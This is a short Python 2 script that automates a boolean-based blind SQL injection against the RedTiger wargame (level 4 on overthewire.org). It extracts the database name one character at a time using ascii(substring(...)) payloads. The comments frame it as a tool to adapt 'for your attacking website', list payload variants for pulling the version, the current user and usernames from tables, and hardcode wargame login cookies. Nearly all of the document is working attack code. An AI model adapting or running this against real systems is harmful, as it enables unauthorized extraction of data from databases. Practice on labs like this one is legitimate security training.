# Blind_injection
# This is a simple python script for simple blind based injection%23
# You have change some code it get the for your attacking website
# for that you need to have knowlege to understand how this code is working
# only then you can use it for your attack and retrieve data
#
# The site http://redtiger.labs.overthewire.org is used
# You can simply do some changes in it get different values
# For eg: 1 and (ascii(substring((version()),%s,1)))=[CHAR]
#         1 and (ascii(substring((current_user()),%s,1)))=[CHAR]
#         1 and (ascii(substring((select username from table1 where email=example@gmail.com),%s,1)))=[CHAR]

import requests
import sys
requests.packages.urllib3.disable_warnings()

cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme',
			'level3login':'feed_the_cat_who_eats_your_bread',
			'level4login':'put_the_kitten_on_your_head'	
}

def searchFriends_sqli(ip, inj_str):
	

	for j in range(32, 126):   
		target = "http://%s/level4.php?id=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
		r = requests.get(target, cookies=cookies)
		content_lenght = int(r.headers['Content-Length'])
		res = r.text
		if "Query returned 1 rows" in res:
			return j
	return None

def main():
	if len(sys.argv) != 2:
		print "(+) usage: %s <target>" % sys.argv[0]
		print '(+) eg: %s redtiger.labs.overthewire.org' %sys.argv[0]
		sys,exit(-1)

	ip = sys.argv[1]

	print "(+) Retrieving database version...."


	extracted = ""
  # If the value would be bigger then len 50 then replace it to something bigger 
	for k in range(1, 50):
		injection_string = "1 and (ascii(substring((database()),%s,1)))=[CHAR]" % k	 
		retrieved_value = searchFriends_sqli(ip, injection_string)
		if(retrieved_value):
			extracted += chr(retrieved_value)
			extracted_char = chr(retrieved_value)
			sys.stdout.write(extracted_char)
			sys.stdout.flush()
		else:
			print "\n(+) done!"
			break


if __name__ == "__main__":
	main()
